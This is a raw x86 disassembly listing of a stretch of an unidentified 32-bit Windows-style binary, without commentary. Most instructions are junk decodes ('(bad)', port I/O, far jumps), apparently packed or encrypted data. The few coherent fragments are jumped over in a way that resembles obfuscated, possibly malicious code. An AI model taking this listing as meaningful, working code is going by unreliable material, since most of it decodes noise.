  40ae64:	fisubr DWORD PTR [ebx-0x38]
  40ae67:	add    ecx,edi
  40ae69:	dec    ebx
  40ae6a:	test   DWORD PTR [ecx+0x5d],edx
  40ae6d:	or     BYTE PTR [eax+ebx*1],bl
  40ae70:	into   
  40ae71:	(bad)  
  40ae72:	xlat   BYTE PTR ds:[ebx]
  40ae73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae74:	dec    esp
  40ae75:	mov    ds,WORD PTR [esi-0x69]
  40ae78:	int3   
  40ae79:	mov    esi,0xbb215381
  40ae7e:	pusha  
  40ae7f:	xchg   ebp,eax
  40ae80:	mov    ds:0x3fadfc54,al
  40ae85:	jns    0x40aeff
  40ae87:	add    ebx,DWORD PTR [ebx]
  40ae89:	add    eax,0x133221df
  40ae8e:	mov    edx,0x1676ce3a
  40ae93:	popf   
  40ae94:	mov    ebx,esp
  40ae96:	stos   DWORD PTR es:[edi],eax
  40ae97:	daa    
  40ae98:	or     DWORD PTR [ebx],0xa943bc0a
  40ae9e:	add    bl,cl
  40aea0:	adc    esp,esi
  40aea2:	jb     0x40ae70
  40aea4:	adc    ch,BYTE PTR [edi]
  40aea6:	ret    
  40aea7:	fbld   TBYTE PTR [ecx+0x37]
  40aeaa:	aad    0x76
  40aeac:	or     ch,dh
  40aeae:	cli    
  40aeaf:	clc    
  40aeb0:	and    BYTE PTR [ebp+0x5af50de0],0x42
  40aeb7:	jno    0x40aea2
  40aeb9:	mov    al,ds:0xe7c66051
  40aebe:	adc    ch,0x0
  40aec1:	lods   eax,DWORD PTR ds:[esi]
  40aec2:	and    DWORD PTR [ebp+0x18795e0],edx
  40aec8:	out    0xfe,eax
  40aeca:	jne    0x40aecd
  40aecc:	push   ss
  40aecd:	dec    edx
  40aece:	sbb    ecx,ebx
  40aed0:	data16 cmp al,0xc9
  40aed3:	lock push ebp
  40aed5:	ret    0x683a
  40aed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed9:	out    dx,eax
  40aeda:	dec    ebp
  40aedb:	xchg   edi,eax
  40aedc:	test   al,0x3c
  40aede:	call   0xe727d610
  40aee3:	inc    edi
  40aee4:	test   al,0x3e
  40aee6:	xor    bl,BYTE PTR [ebx+edi*8+0x7e]
  40aeea:	pop    esp
  40aeeb:	dec    ebx
  40aeec:	stos   DWORD PTR es:[edi],eax
  40aeed:	out    0x29,eax
  40aeef:	js     0x40aecf
  40aef1:	(bad)  
  40aef2:	clc    
  40aef3:	and    edi,edi
  40aef5:	sub    DWORD PTR [esi-0x92980e9],0xe0ce950a
  40aeff:	mov    al,ds:0x2a103352
  40af04:	pop    es
  40af05:	jmp    0x40af4b
  40af07:	add    BYTE PTR ds:0xfa69624a,0x72
  40af0e:	push   es
  40af0f:	xor    al,0x8b
  40af11:	pop    ds
  40af12:	imul   esp,DWORD PTR [eax-0x43],0x35
  40af16:	and    ah,BYTE PTR [ebx+0x2d]
  40af19:	push   es
  40af1a:	rol    BYTE PTR [edx+0x20],cl
  40af1d:	es fdivp st(6),st
  40af20:	lock xchg esi,eax
  40af22:	and    BYTE PTR ds:0x395239e2,ah
  40af28:	in     eax,dx
  40af29:	cld    
  40af2a:	fcom   QWORD PTR [edx-0x433d41e5]
  40af30:	sub    eax,edi
  40af32:	pop    edx
  40af33:	pop    es
  40af34:	int3   
  40af35:	sub    BYTE PTR [eax-0x18b53d9d],ch
  40af3b:	adc    ebx,DWORD PTR [ebx]
  40af3d:	mov    ch,0xf5
  40af3f:	lods   al,BYTE PTR ds:[esi]
  40af40:	xor    bl,BYTE PTR es:[ebx-0x71]
  40af44:	std    
  40af45:	pushf  
  40af46:	sbb    bh,ah
  40af48:	mov    ebx,0x2834f464
  40af4d:	add    eax,0xb42ed61b
  40af52:	fidiv  DWORD PTR [ebx]
  40af54:	lock (bad) 
  40af56:	imul   BYTE PTR [ecx]
  40af58:	fild   QWORD PTR [ecx+edi*4+0x1a]
  40af5c:	test   DWORD PTR [ebx+0x20384bb],0xbd30fd9b
  40af66:	cmp    edi,ecx
  40af68:	les    esp,FWORD PTR [edx-0x47]
  40af6b:	xchg   ecx,eax
  40af6c:	mov    eax,0x77ee4610
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433727
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4336df
  40af93:	sub    DWORD PTR ds:0x43368f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4336db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4336db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4336db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4336db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4336db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4336db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4336db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4336db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433727,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	mov    ecx,0x6453ff94
  40b01c:	idiv   DWORD PTR [esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	push   cs
  40b024:	adc    DWORD PTR [esi+0x6d],ebp
  40b027:	je     0x40afd9
  40b029:	les    edx,FWORD PTR [eax]
  40b02b:	in     eax,0xb1
  40b02d:	mov    ebx,0x725b933c
  40b032:	dec    eax
  40b033:	sahf   
  40b034:	push   0xffffffc4
  40b036:	mov    ds:0x68b62ea6,al
  40b03b:	xchg   edx,eax
  40b03c:	mov    esi,DWORD PTR [esi]
  40b03e:	or     BYTE PTR [ecx],0xe3
  40b041:	rcl    DWORD PTR [edx],1
  40b043:	cmp    DWORD PTR [ecx+ecx*4+0x2aedb522],esp
  40b04a:	shl    DWORD PTR [ebp+0x62],1
  40b04d:	les    esi,FWORD PTR [edx+edx*1]
  40b050:	aad    0x99
  40b052:	push   edi
  40b053:	and    ebp,edi
  40b055:	pop    esp
  40b056:	and    edi,edi
  40b058:	dec    edi
  40b059:	jns    0x40b02f
  40b05b:	adc    eax,0x961cbdb5
  40b060:	and    al,0x73
  40b062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b063:	mov    ds:0xf5f01bbe,eax
  40b068:	retf   
  40b069:	inc    edx
  40b06a:	lods   eax,DWORD PTR ds:[esi]
  40b06b:	sub    eax,0xe14feaad
  40b070:	test   BYTE PTR [esi+0x60],bh
  40b073:	shr    bl,cl
  40b075:	inc    eax
  40b076:	inc    ebx
  40b077:	jmp    0x442ed6d7
  40b07c:	inc    esi
  40b07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b07e:	push   esi
  40b07f:	mov    ebp,0x78a03470
  40b084:	xchg   edx,eax
  40b085:	hlt    
  40b086:	mov    ah,0xa0
  40b088:	push   esi
  40b089:	inc    ebx
  40b08a:	aaa    
  40b08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b08c:	xchg   ebp,eax
  40b08d:	popf   
  40b08e:	ror    DWORD PTR [eax-0x10bd30e5],cl
  40b094:	push   es
  40b095:	and    DWORD PTR [ebx-0x10539ccd],esi
  40b09b:	arpl   WORD PTR [ebx],sp
  40b09d:	in     eax,0xa9
  40b09f:	and    al,0xda
  40b0a1:	push   cs
  40b0a2:	(bad)  
  40b0a3:	sbb    dh,BYTE PTR [eax+0x55714a40]
  40b0a9:	pop    edx
  40b0aa:	mov    cl,0x1c
  40b0ac:	mov    ch,0x8e
  40b0ae:	imul   ebx,esi,0x1ec50e2d
  40b0b4:	fimul  WORD PTR [eax+0x2dc850ae]
  40b0ba:	or     eax,0xec0ab5c2
  40b0bf:	sbb    BYTE PTR [ebx+0x69],0x5
  40b0c3:	xor    cl,ch
  40b0c5:	and    ecx,DWORD PTR [edx]
  40b0c7:	cmp    al,0xd6
  40b0c9:	sub    eax,0x7165b4cd
  40b0ce:	cmp    BYTE PTR [ebx],dh
  40b0d0:	xchg   ecx,eax
  40b0d1:	xor    dl,cl
  40b0d3:	fld    TBYTE PTR [ecx+edx*1+0x3a96b4a1]
  40b0db:	xchg   esp,eax
  40b0dc:	cmp    BYTE PTR [edi+0x7f],bl
  40b0df:	pop    ebp
  40b0e0:	add    al,0x40
  40b0e2:	mov    DWORD PTR [ebx+0x6c],esi
  40b0e5:	popa   
  40b0e6:	push   es
  40b0e7:	es mov ch,0xef
  40b0ea:	and    BYTE PTR [ecx],dl
  40b0ec:	push   0xfc43dad8
  40b0f1:	pop    esp
  40b0f2:	or     DWORD PTR [ebp-0x795d380c],esi
  40b0f8:	mov    al,ds:0xb4c982e1
  40b0fd:	daa    
  40b0fe:	nop
  40b0ff:	fcomi  st,st(7)
  40b101:	dec    eax
  40b102:	mov    ecx,0x1dde5856
  40b107:	es dec ebp
  40b109:	or     ch,BYTE PTR [edx]
  40b10b:	push   0x996ea798
  40b110:	es fwait
  40b112:	sub    BYTE PTR [ebp-0x12060aa5],bl
  40b118:	jae    0x40b129
  40b11a:	push   DWORD PTR [eax-0x33]
  40b11d:	test   esi,ebp
  40b11f:	sub    al,BYTE PTR [ecx-0x78]
  40b122:	xor    DWORD PTR [ecx+0x52],esi
  40b125:	fcomp  DWORD PTR [ecx+0x318e4bf3]
  40b12b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b12c:	outs   dx,BYTE PTR ds:[esi]
  40b12d:	test   DWORD PTR [ebx],ebx
  40b12f:	mov    esp,0x265fe0e5
  40b134:	pop    esi
  40b135:	inc    eax
  40b136:	loop   0x40b15c
  40b138:	xchg   esi,eax
  40b139:	enter  0xb132,0x62
  40b13d:	sbb    BYTE PTR [ebp-0x7d6d9e07],al
  40b143:	(bad)  
  40b144:	mov    bl,0xeb
  40b146:	es push ds
  40b148:	lds    edi,FWORD PTR [ebx+eiz*8]
  40b14b:	inc    edx
  40b14c:	push   cs
  40b14d:	xchg   BYTE PTR [ebp+0x1a3a0b3d],ah
  40b153:	ins    BYTE PTR es:[edi],dx
  40b154:	(bad)  
  40b155:	sbb    al,0xef
  40b157:	ss pop es
  40b159:	push   ecx
  40b15a:	xchg   esi,eax
  40b15b:	pop    ebp
  40b15c:	imul   ebp,DWORD PTR [edx+0x37],0xe9c6364d
  40b163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b164:	cmc    
  40b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b166:	fdiv   st(3),st
  40b168:	xchg   ebp,eax
  40b169:	push   ss
  40b16a:	jnp    0x40b1a8
  40b16c:	fld    TBYTE PTR [ebx+0x616d0c13]
  40b172:	cmp    eax,0x3f793167
  40b177:	inc    ecx
  40b178:	neg    BYTE PTR [esi-0x1a0f3fa5]
  40b17e:	stc    
  40b17f:	je     0x40b10b
  40b181:	mov    dh,0x84
  40b183:	sahf   
  40b184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b185:	dec    ebx
  40b186:	xor    ebx,DWORD PTR [edx]
  40b188:	ja     0x40b1d1
  40b18a:	inc    esi
  40b18b:	jnp    0x40b180
  40b18d:	jo     0x40b183
  40b18f:	lods   al,BYTE PTR ds:[esi]
  40b190:	sbb    dl,BYTE PTR [eax-0x33a77c1e]
  40b196:	xsavec [ebx+ecx*8+0x1d43b6d4]
  40b19e:	aaa    
  40b19f:	call   DWORD PTR [esi]
  40b1a1:	imul   esp,DWORD PTR [ebx+edx*8+0x11],0xef38a61b
  40b1a9:	xchg   esp,eax
  40b1aa:	or     esp,DWORD PTR [eax+edi*8-0x59]
  40b1ae:	cli    
  40b1af:	outs   dx,DWORD PTR ds:[esi]
  40b1b0:	or     BYTE PTR ds:0xd46ccb83,ah
  40b1b6:	bound  edx,QWORD PTR [edi+0x552edf71]
  40b1bc:	adc    DWORD PTR [edi-0x1b],edi
  40b1bf:	mov    bh,0x6a
  40b1c1:	mov    al,ds:0x58b51f9b
  40b1c6:	mov    ecx,ebx
  40b1c8:	out    0xa7,al
  40b1ca:	cli    
  40b1cb:	fstp   TBYTE PTR [edi+eiz*8]
  40b1ce:	(bad)  
  40b1d0:	mov    al,ds:0xb880b4e5
  40b1d5:	and    al,0x3c
  40b1d7:	call   0x19d0:0x5d70ccb1
  40b1de:	fst    QWORD PTR [ecx+0x7e]
  40b1e1:	inc    eax
  40b1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1e3:	mov    ds:0x3c5460de,eax
  40b1e8:	dec    eax
  40b1e9:	jbe    0x40b240
  40b1eb:	mov    dl,0xb0
  40b1ed:	arpl   WORD PTR [esi-0x12],sp
  40b1f0:	mov    bl,ch
  40b1f2:	xor    ecx,DWORD PTR [esi]
  40b1f4:	xlat   BYTE PTR ds:[ebx]
  40b1f5:	pop    es
  40b1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f7:	sar    BYTE PTR [edi],cl
  40b1f9:	push   ecx
  40b1fa:	dec    esi
  40b1fb:	xor    BYTE PTR [edi+0x3c51f186],al
  40b201:	jl     0x40b24a
  40b203:	and    al,0x50
  40b205:	mov    BYTE PTR [eax+0x74],al
  40b208:	jecxz  0x40b1ae
  40b20a:	push   ebx
  40b20b:	loope  0x40b1c9
  40b20d:	enter  0x67e6,0x8d
  40b211:	sub    DWORD PTR [edx-0x66671d66],ebx
  40b217:	or     BYTE PTR cs:[esi+0x686d5ec7],0xc1
  40b21f:	loop   0x40b281
  40b221:	pop    es
  40b222:	and    bl,0x46
  40b225:	cdq    
  40b226:	outs   dx,DWORD PTR ds:[esi]
  40b227:	dec    ebp
  40b228:	imul   eax,edi,0x308d77a2
  40b22e:	test   al,0x2d
  40b230:	and    ah,BYTE PTR [ebx+0x119085c1]
  40b236:	hlt    
  40b237:	push   ebx
  40b238:	jmp    0x26f0ffda
  40b23d:	les    ecx,FWORD PTR [esp+edi*4+0x2c9db406]
  40b244:	xor    DWORD PTR [eax],eax
  40b246:	jmp    0x8a52:0x7570e691
  40b24d:	pop    ss
  40b24e:	mov    cl,0xd
  40b250:	test   eax,0x6fb065ed
  40b255:	shl    DWORD PTR [edi],1
  40b257:	jle    0x40b2a2
  40b259:	(bad)  
  40b25a:	xor    BYTE PTR [esi+0x50],0xfd
  40b25e:	scas   eax,DWORD PTR es:[edi]
  40b25f:	enter  0x60d,0x74
  40b263:	shr    DWORD PTR [ebp+0x5a],0xa0
  40b267:	daa    
  40b268:	je     0x40b1f5
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	aam    0xfe
  40b285:	cmp    al,0x39
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	call   0xb832:0xa6cc708d
  40b296:	xchg   ebx,eax
  40b297:	xor    bl,dl
  40b299:	cmp    DWORD PTR [esi+0x28],edx
  40b29c:	jmp    0x40b2d5
  40b29e:	aas    
  40b29f:	out    dx,eax
  40b2a0:	inc    ebp
  40b2a1:	fadd   st(4),st
  40b2a3:	test   eax,0xc35faa97
  40b2a8:	or     al,0xe0
  40b2aa:	mov    cl,0xcc
  40b2ac:	enter  0x5aed,0xc7
  40b2b0:	sub    esi,DWORD PTR [ecx]
  40b2b2:	es aam 0xc0
  40b2b5:	add    al,0xc7
  40b2b7:	lods   eax,DWORD PTR ds:[esi]
  40b2b8:	aad    0x4a
  40b2ba:	mov    ecx,0xe4de13a0
  40b2bf:	pop    edi
  40b2c0:	mov    gs,WORD PTR ds:0x4f3a0644
  40b2c6:	jl     0x40b339
  40b2c8:	push   eax
  40b2c9:	jbe    0x40b24d
  40b2cb:	dec    edi
  40b2cc:	div    BYTE PTR [edi+0x53f09f27]
  40b2d2:	ins    DWORD PTR es:[edi],dx
  40b2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d4:	icebp  
  40b2d5:	mov    BYTE PTR [edx+0x4d574d76],ah
  40b2db:	or     cl,bl
  40b2dd:	call   0xaf1c:0xc91c3caf
  40b2e4:	dec    edx
  40b2e5:	mov    edx,DWORD PTR [ebx-0x1e]
  40b2e8:	jno    0x40b31c
  40b2ea:	loop   0x40b28a
  40b2ec:	mov    dl,0x86
  40b2ee:	sub    esp,0x93baeaeb
  40b2f4:	jnp    0x40b32d
  40b2f6:	(bad)  
  40b2f8:	test   al,0xcc
  40b2fa:	push   ds
  40b2fb:	push   0x5
  40b2fd:	out    0x1,eax
  40b2ff:	addr16 jmp 0x763f9a8
  40b305:	hlt    
  40b306:	call   0x4282f26d
  40b30b:	adc    BYTE PTR ds:0x81d0ab7,al
  40b311:	fild   DWORD PTR [ecx+0x304be385]
  40b317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b318:	jecxz  0x40b2d0
  40b31a:	jge    0x40b317
  40b31c:	pop    edi
  40b31d:	dec    edi
  40b31e:	(bad)  
  40b31f:	(bad)  
  40b320:	in     al,dx
  40b321:	sbb    al,0x90
  40b323:	imul   eax,DWORD PTR [eax+ebp*1+0x62e724d5],0xfffffffd
  40b32b:	dec    ecx
  40b32c:	mov    esi,0x39016202
  40b331:	aaa    
  40b332:	and    cl,bl
  40b334:	iret   
  40b335:	repz sbb BYTE PTR [edx],0x4c
  40b339:	rol    BYTE PTR [ebx-0x1eac473f],1
  40b33f:	sub    BYTE PTR [edx-0x1ecf3864],cl
  40b345:	cli    
  40b346:	add    BYTE PTR [eax-0x3f491910],bl
  40b34c:	and    bl,BYTE PTR [ebp+0x63]
  40b34f:	cmp    al,0xf8
  40b351:	repnz aaa 
  40b353:	cmp    BYTE PTR [ebp-0x17],bh
  40b356:	xchg   ebp,eax
  40b357:	mov    edx,0x8816622f
  40b35c:	fimul  DWORD PTR ds:0x4d68b585
  40b362:	and    eax,esp
  40b364:	arpl   WORD PTR ds:0xa639a168,bx
  40b36a:	lods   al,BYTE PTR ds:[esi]
  40b36b:	mov    cl,0xa9
  40b36d:	cmp    eax,0x18ca33b8
  40b372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b373:	retf   0xb951
  40b376:	xor    BYTE PTR [edx-0xa526c0a],al
  40b37c:	jae    0x40b390
  40b37e:	mov    edx,0x7f38a59
  40b383:	mov    ebp,DWORD PTR [ebx+0x38]
  40b386:	mov    ds:0xa7286537,al
  40b38b:	xchg   ebp,eax
  40b38c:	cmp    al,BYTE PTR [ecx+0x40]
  40b38f:	arpl   WORD PTR [esi+0x14ba2b7f],di
  40b395:	(bad)  
  40b397:	scas   eax,DWORD PTR es:[edi]
  40b398:	xor    BYTE PTR [ebx-0x65d1223f],0xc4
  40b39f:	cli    
  40b3a0:	cmp    edi,DWORD PTR [ebp-0x3981dbf5]
  40b3a6:	mov    ebp,0x88267527
  40b3ab:	jecxz  0x40b3b0
  40b3ad:	sti    
  40b3ae:	js     0x40b3e8
  40b3b0:	adc    BYTE PTR [esi+0x11],al
  40b3b3:	dec    eax
  40b3b4:	hlt    
  40b3b5:	mov    edi,0x3dbde127
  40b3ba:	xchg   esp,eax
  40b3bb:	hlt    
  40b3bc:	je     0x40b40e
  40b3be:	mov    ah,0x87
  40b3c0:	cmp    BYTE PTR [eax+0x7d6a606f],al
  40b3c6:	in     al,dx
  40b3c7:	cwde   
  40b3c8:	icebp  
  40b3c9:	pop    edi
  40b3ca:	jnp    0x40b357
  40b3cc:	out    0xbf,al
  40b3ce:	and    bh,BYTE PTR [esi-0x3]
  40b3d1:	ja     0x40b378
  40b3d3:	push   edx
  40b3d4:	sbb    DWORD PTR [edx+0x335753c4],ecx
  40b3da:	retf   
  40b3db:	inc    ebx
  40b3dc:	ds mov dh,0x2b
  40b3df:	and    BYTE PTR [eax+0x67],ah
  40b3e2:	mov    ds:0xe3d0297a,al
  40b3e7:	cmp    BYTE PTR [ebx+ebp*4+0x6068b4aa],dl
  40b3ee:	cmp    al,bl
  40b3f0:	and    edx,DWORD PTR [edi+0x3b]
  40b3f3:	adc    esi,eax
  40b3f5:	sahf   
  40b3f6:	cmp    eax,0xa06829ba
  40b3fb:	xor    bh,BYTE PTR [ebx+eax*4-0x69]
  40b3ff:	and    BYTE PTR [eax+0x73f5c38d],0xbb
  40b406:	jno    0x40b3b5
  40b408:	aas    
  40b409:	adc    ebp,0x7ffcb864
  40b40f:	fiadd  DWORD PTR [ecx]
  40b411:	cs xor eax,0x3cccc154
  40b417:	pop    es
  40b418:	xchg   ebp,eax
  40b419:	dec    esp
  40b41a:	inc    esp
  40b41b:	mov    eax,0xaeae57a
  40b420:	mov    ebp,0x8a890e2c
  40b425:	popa   
  40b426:	lea    ebx,[eax+0x70]
  40b429:	mov    ds:0x258b1f41,eax
  40b42e:	jge    0x40b3cc
  40b430:	mov    al,0xf0
  40b432:	ror    BYTE PTR [edx+edi*2],0xf7
  40b436:	mov    al,0x17
  40b438:	nop
  40b439:	loopne 0x40b45e
  40b43b:	mov    bl,0x98
  40b43d:	fnstenv [ecx+edx*1-0x7b3691ae]
  40b444:	inc    esp
  40b445:	jecxz  0x40b3ea
  40b447:	inc    ecx
  40b448:	rcr    BYTE PTR [ebx+edx*8],1
  40b44b:	xchg   ebx,eax
  40b44c:	add    ebp,DWORD PTR [edi-0x48]
  40b44f:	cmp    eax,0x9d032037
  40b454:	dec    edx
  40b455:	fadd   DWORD PTR [edx+0x2b8e9784]
  40b45b:	pop    esi
  40b45c:	and    esp,DWORD PTR [ebx-0x2b277be2]
  40b462:	retf   
  40b463:	xchg   edx,eax
  40b464:	cs scas eax,DWORD PTR es:[edi]
  40b466:	mov    al,0x48
  40b468:	mov    eax,ds:0x44390dc4
  40b46d:	mov    DWORD PTR [edi+0x2],ecx
  40b470:	lahf   
  40b471:	xlat   BYTE PTR ds:[ebx]
  40b472:	xor    al,0x52
  40b474:	xor    al,0x43
  40b476:	ud2    
  40b478:	or     esp,esi
  40b47a:	and    al,BYTE PTR [esi+0x2f]
  40b47d:	dec    ecx
  40b47e:	jge    0x40b42b
  40b480:	stos   BYTE PTR es:[edi],al
  40b481:	mov    ecx,0xae23f03f
  40b486:	sub    ch,BYTE PTR [edi+0x71]
  40b489:	sub    cl,BYTE PTR [ecx-0x7c]
  40b48c:	add    edx,DWORD PTR [eax-0x4b]
  40b48f:	rol    BYTE PTR [ebx+0x45ceb27f],cl
  40b495:	in     eax,0x21
  40b497:	int    0x95
  40b499:	cmp    BYTE PTR [ebx+ebx*1-0x53],0xd2
  40b49e:	xchg   edi,eax
  40b49f:	dec    esi
  40b4a0:	push   ebp
  40b4a1:	test   eax,0x91410c37
  40b4a6:	inc    edi
  40b4a7:	rcl    DWORD PTR [edx+0x66],0x6d
  40b4ab:	and    ecx,DWORD PTR [ebp+0x3251890f]
  40b4b1:	test   DWORD PTR [ecx+0x6a],eax
  40b4b4:	ins    DWORD PTR es:[edi],dx
  40b4b5:	xabort 0xd1
  40b4b8:	mov    ecx,0x8bdcf07b
  40b4bd:	sar    BYTE PTR [ebx+0x24],1
  40b4c0:	mov    al,ds:0x8d437a4a
  40b4c5:	sbb    bh,BYTE PTR [eax*1+0x798b26cf]
  40b4cc:	sbb    eax,0x728c1618
  40b4d1:	in     eax,dx
  40b4d2:	sub    ah,dh
  40b4d4:	add    ecx,DWORD PTR [ecx+0x458bd44d]
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	push   ecx
  40b508:	pop    edx
  40b509:	out    dx,al
  40b50a:	xor    eax,ebp
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	dec    eax
  40b514:	in     eax,0xdc
  40b516:	ror    DWORD PTR [ebp-0x6d871c88],0xf2
  40b51d:	inc    BYTE PTR [eax]
  40b51f:	ins    BYTE PTR es:[edi],dx
  40b520:	jns    0x40b4c7
  40b522:	jne    0x40b512
  40b524:	push   ebx
  40b525:	mov    bl,0x1
  40b527:	pop    edx
  40b528:	pop    ss
  40b529:	stos   BYTE PTR es:[edi],al
  40b52a:	imul   eax,ebx,0x79
  40b52d:	inc    esp
  40b52e:	repnz (bad) 
  40b530:	sbb    BYTE PTR [edi],dl
  40b532:	cld    
  40b533:	(bad)  
  40b534:	pop    ebp
  40b535:	(bad)  
  40b537:	sub    DWORD PTR [eax-0x6a],esp
  40b53a:	and    eax,0x2a9d7ef
  40b53f:	addr16 mov ds:0xe1a9,al
  40b543:	mov    ds:0x9ea10492,al
  40b548:	ss push 0xf140b743
  40b54e:	adc    al,BYTE PTR [esi-0x76]
  40b551:	lds    eax,FWORD PTR [ebx-0x3]
  40b554:	in     al,0xe7
  40b556:	push   0x27
  40b558:	xor    BYTE PTR [edi+0x5e],bl
  40b55b:	stos   DWORD PTR es:[edi],eax
  40b55c:	popa   
  40b55d:	sahf   
  40b55e:	inc    ebp
  40b55f:	adc    eax,0xccb3f59f
  40b564:	pop    eax
  40b565:	fs jns 0x40b5bb
  40b568:	inc    ebx
  40b569:	and    ah,bh
  40b56b:	xlat   BYTE PTR ds:[ebx]
  40b56c:	cld    
  40b56d:	dec    eax
  40b56e:	add    al,0xc8
  40b570:	inc    BYTE PTR [esi]
  40b572:	adc    eax,0x99f46073
  40b577:	(bad)  [edi]
  40b579:	cld    
  40b57a:	adc    edi,DWORD PTR [edi]
  40b57c:	outs   dx,DWORD PTR ds:[esi]
  40b57d:	jns    0x40b536
  40b57f:	push   ds
  40b580:	nop
  40b581:	pop    esi
  40b582:	gs int 0x46
  40b585:	xchg   edi,eax
  40b586:	inc    ecx
  40b587:	scas   al,BYTE PTR es:[edi]
  40b588:	jg     0x40b511
  40b58a:	lds    esi,FWORD PTR ds:0x70335476
  40b590:	aad    0x6c
  40b592:	(bad)  
  40b593:	shl    BYTE PTR [ebx+0x44],cl
  40b596:	stos   DWORD PTR es:[edi],eax
  40b597:	push   esi
  40b598:	jbe    0x40b5d5
  40b59a:	xchg   esi,eax
  40b59b:	cmp    BYTE PTR [esi+0x68],ch
  40b59e:	mov    BYTE PTR [ecx-0x277603dc],al
  40b5a4:	fimul  WORD PTR [ebp-0x585db115]
  40b5aa:	repz dec esp
  40b5ac:	frstor [ebx]
  40b5ae:	scas   eax,DWORD PTR es:[edi]
  40b5af:	js     0x40b561
  40b5b1:	leave  
  40b5b2:	push   ebx
  40b5b3:	xchg   BYTE PTR [ebp-0x21f50ed5],cl
  40b5b9:	(bad)  
  40b5ba:	aad    0xe8
  40b5bc:	(bad)  
  40b5bd:	jmp    0xafa:0x92eca6df
  40b5c4:	fist   DWORD PTR [eax+ecx*2+0x72]
  40b5c8:	mov    al,0xcc
  40b5ca:	es pop ecx
  40b5cc:	mov    ds:0x9aa2f90e,al
  40b5d1:	call   DWORD PTR gs:[ecx-0x48c1462]
  40b5d8:	hlt    
  40b5d9:	mov    WORD PTR [esp+esi*2-0x7025e882],es
  40b5e0:	gs hlt 
  40b5e2:	stos   BYTE PTR es:[edi],al
  40b5e3:	pop    edi
  40b5e4:	and    eax,0xef56b464
  40b5e9:	or     ah,BYTE PTR [eax]
  40b5eb:	dec    esi
  40b5ec:	dec    ebp
  40b5ed:	inc    esi
  40b5ee:	adc    eax,0x96bda260
  40b5f3:	jnp    0x40b652
  40b5f5:	sahf   
  40b5f6:	stos   BYTE PTR es:[edi],al
  40b5f7:	out    0x33,al
  40b5f9:	mov    DWORD PTR [ebp+0x27a3033b],esp
  40b5ff:	add    DWORD PTR [eax-0x654e5ad3],eax
  40b605:	dec    esi
  40b606:	addr16 fs or dh,dh
  40b60a:	test   DWORD PTR [eax-0x6c063e22],0x287bc112
  40b614:	fidivr WORD PTR [edx+0x2a53cc7c]
  40b61a:	daa    
  40b61b:	xchg   edi,eax
  40b61c:	inc    ebp
  40b61d:	push   es
  40b61e:	mov    DWORD PTR [eax-0x43ec5267],ebx
  40b624:	lods   eax,DWORD PTR ds:[esi]
  40b625:	sbb    BYTE PTR [ecx+ecx*2],ah
  40b628:	mov    edi,0x2c1e0f29
